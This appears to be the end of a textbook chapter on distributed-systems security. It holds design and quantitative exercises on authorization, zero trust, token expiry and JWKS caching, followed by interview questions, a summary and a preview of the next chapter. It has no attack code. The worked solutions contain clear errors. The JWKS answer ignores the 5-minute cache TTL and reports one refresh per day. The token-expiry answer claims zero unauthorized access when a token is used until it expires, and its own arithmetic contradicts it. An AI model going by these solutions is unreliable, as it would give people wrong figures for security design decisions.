1. **Multi-tenant authorization:** A SaaS platform has enterprises (tenants) each with departments. A "department manager" can manage users within their department. A "company admin" manages all departments in their company. A "platform admin" manages all companies. Design the full authorization model: data schema, API enforcement, caching strategy, and the cascade effect of changing a user's role.

2. **Zero-trust for microservices:** Design the complete zero-trust architecture for a 20-service e-commerce platform on Kubernetes. Include: service identity (what issues certificates?), service-to-service authentication (what protocol?), authorization policy (what tool enforces it?), secret distribution (how does each service get its database credentials?), and audit logging (what events and where stored?).

3. **Incident response design:** Design an automated incident response for a suspected credential compromise. Trigger: >50 failed auth attempts from a user in 5 minutes. Actions: (1) immediately revoke all active sessions, (2) require password reset on next login, (3) send alert to security team with timeline, (4) log to immutable audit store. What infrastructure components are involved?

### Quantitative Exercises

1. **Token expiry risk calculation:** Access tokens expire in 60 minutes. Your MTTR (mean time to revoke) after detecting a compromise is 15 minutes. An attacker steals a token at a random time within the token's validity period. What is the expected window of unauthorized access? What token expiry would reduce this to <5 minutes expected unauthorized access?

2. **JWKS cache performance:** Your service handles 50,000 RPS. JWT validation takes 1.5ms per request when the JWKS is cached (in-memory). JWKS cache miss (network fetch) takes 150ms. Your IdP rotates keys every 24 hours. Cache TTL is 5 minutes. How many JWKS refreshes occur per service instance per day? What fraction of requests experience cache miss latency?

### Solutions to Quantitative Exercises

**Exercise 1 — Token expiry risk:**
- Token valid for 60 minutes. Attacker steals at random point in 60-minute window.
- Average time remaining on stolen token: 60/2 = 30 minutes.
- MTTR after detection: 15 minutes. But: detection may take time too.
- Expected unauthorized access window: 30 minutes (if immediate detection) up to 60 minutes (if detected just as token expires).
- Assuming detection at MTTR (15 min after theft): stolen token has 30 min expected remaining - 15 min MTTR = **15 minutes expected unauthorized access**.
- For <5 minutes expected unauthorized access with 15-minute MTTR:
  Need: (expiry/2) - MTTR < 5 → expiry/2 < 20 → expiry < 40 minutes.
  But to be safe: expiry = **15 minutes** (stolen token at midpoint = 7.5 min remaining; MTTR=15 min means token expired before revocation — zero access window).

**Exercise 2 — JWKS cache performance:**
- Key rotations per day: 1 rotation / 24 hours = 1 rotation.
- Cache TTL: 5 minutes. After rotation: all in-memory caches have old key.
- Cache miss on first request after key rotation: at most `num_instances` cache misses, over 5-minute TTL window = **1 JWKS refresh per instance per key rotation** = 1 refresh per 24 hours per instance.
- Additional refreshes: for unknown `kid` (won't happen if only 1 key). Total: **1 refresh/day per instance**.
- Fraction of requests with cache-miss latency: 1 refresh per 86,400 seconds. At 50,000 RPS, total requests per day = 4.32 billion. Cache miss requests = **effectively 0% (1 in 4.32 billion)**.
- Practical concern: on service restart (cold cache). First request = 150ms. Negligible for autoscaling fleets.

---

## Interview Questions

### Beginner Level

1. What is the difference between authentication and authorization?
2. What is a JWT and what three parts does it contain?
3. What is OAuth2 used for? When would you use the Client Credentials flow?
4. What is the principle of least privilege and why does it matter?
5. What is a secret and why should it not be stored in source code?

### Senior Level

1. Explain the Authorization Code + PKCE flow. What attack does PKCE prevent?
2. Describe the five critical JWT validation steps. What happens if you skip audience validation?
3. Design a session management system for a web application: what token types, what storage mechanism, how do you handle revocation?
4. A service needs to connect to PostgreSQL. Compare: (a) static password in environment variable, (b) Vault dynamic credentials. What is the security improvement and operational cost of each?
5. Explain mTLS for service-to-service authentication. What does it prove that a JWT cannot?

### Staff Level

1. Design the complete RBAC system for a multi-tenant SaaS with 10,000 tenants. Include: data model, caching strategy, invalidation, and performance under 100K RPS.
2. Implement JWT validation in a language of your choice, demonstrating all five validation steps. Explain the attack prevented by each step.
3. Explain zero-trust networking. How does BeyondCorp differ from VPN-based access? Design the authentication architecture for an engineer accessing a production database.
4. A security audit finds that 3 of your 20 microservices share the same AWS IAM role. What is the risk? How do you remediate without service downtime?

### Principal Level

1. Design the security architecture for a healthcare SaaS platform (HIPAA compliance). What specific controls are required for: data access, audit logging, session management, encryption, and third-party integrations?
2. Analyze the Okta 2023 breach. What architectural controls would have: (a) prevented the initial compromise, (b) limited the blast radius after compromise, (c) enabled faster detection?
3. Design a supply chain security program for a 500-engineer company shipping to 10,000 enterprise customers. Include: SBOM generation and distribution, container image signing, dependency vulnerability management, and breach notification procedures.
4. Compare RBAC, ABAC, and ReBAC (relationship-based access control) for a social network where: users can share posts with specific friends, friends-of-friends, or the public; groups have admins, members, and moderators; content can be flagged, hidden, or removed by different roles. Which model is correct and how would you implement it at scale?

---

## Summary

Security in distributed systems rests on three pillars: authentication (proving identity), authorization (enforcing access policy), and transport security (protecting data in transit). Zero-trust extends these three pillars by requiring they be applied to every request, from every source, regardless of network location.

OAuth2 and OIDC provide the industry standard for authentication flows: Authorization Code + PKCE for user-facing applications, Client Credentials for service-to-service authentication, and Device Flow for input-constrained devices. JWTs are the mechanism for conveying identity between services — but only when validated correctly: algorithm restriction, signature verification, expiration, audience, and issuer checks are all required and each prevents a specific attack class.

RBAC is the practical authorization model for most systems: roles with permissions, users with roles, cached permission sets for performance, and explicit cache invalidation on role change. OPA (Open Policy Agent) decouples complex authorization policy from application code, enabling policy-as-code with version control, testing, and consistent enforcement across all services.

Zero-trust replaces perimeter trust with identity-based trust: every service proves its identity via mTLS (SPIFFE/SPIRE certificates), authorization policies enforce what each service identity may do, and network policies prevent lateral movement after compromise. Secrets management via Vault or AWS Secrets Manager eliminates static credentials — dynamic credentials expire automatically, limiting the blast radius of any compromise.

Supply chain security (SLSA, SBOM, Sigstore) ensures the software you deploy is the software you built — not a tampered artifact. The SolarWinds and Log4Shell incidents demonstrated that build pipeline compromise and dependency vulnerabilities are the dominant attack vectors for sophisticated adversaries.

---

## What You Should Now Be Able To Explain

- **OAuth2 flow selection:** Why Authorization Code + PKCE (not implicit) for browsers and mobile, Client Credentials for service-to-service, Device Flow for constrained devices — and what security property each design decision provides
- **JWT validation completeness:** The five required validation steps (algorithm, signature, expiry, audience, issuer), the specific attack prevented by each, and why skipping any single step introduces a vulnerability class
- **RBAC at scale:** The data model (users→roles→permissions), the caching layer (Redis per-user permission set with explicit invalidation), and why JWT-embedded roles are insufficient for systems that need real-time revocation
- **Zero-trust principles:** Why perimeter security fails for cloud-native architectures, the three technical pillars (identity via mTLS, authorization via policy, context evaluation via anomaly detection), and how Kubernetes NetworkPolicy + Istio AuthorizationPolicy implement the model
- **Dynamic credentials:** Why static database passwords are a standing security liability, how Vault generates per-instance, TTL-limited credentials, and how the Kubernetes auth method solves the secret-zero bootstrapping problem
- **Supply chain security:** What an SBOM is and why it was operationally critical during Log4Shell, how Sigstore keyless signing ties container image provenance to CI/CD identity, and what SLSA level protects against which attack class

---

## What To Learn Next

**Chapter 34 — System Design Interview Mastery: Framework, Patterns, and Execution**

Having built comprehensive knowledge of distributed systems fundamentals through Chapter 33, Chapter 34 synthesizes everything into a systematic framework for the system design interview — the primary evaluation mechanism for Staff and Principal Engineer roles at top-tier companies. We will examine the exact structure interviewers expect (requirements clarification → estimation → high-level design → deep dive → bottlenecks → trade-offs), the ten canonical system design problems (URL shortener, rate limiter, distributed cache, notification system, feed ranking, ride-sharing, payment system, search autocomplete, video streaming platform, distributed file storage) with complete walkthrough answers, the specific signals interviewers look for at each level (L5/Senior vs L6/Staff vs L7/Principal), and common failure modes that cause rejection (over-engineering, under-specifying, jumping to solution before understanding requirements). We will cover back-of-envelope estimation rigorously (QPS, storage, bandwidth calculations), the art of making and justifying trade-offs under time pressure, and how to demonstrate Principal-level thinking (failure modes, operational considerations, evolution path, cost analysis) versus Senior-level thinking (correct components, reasonable choices).
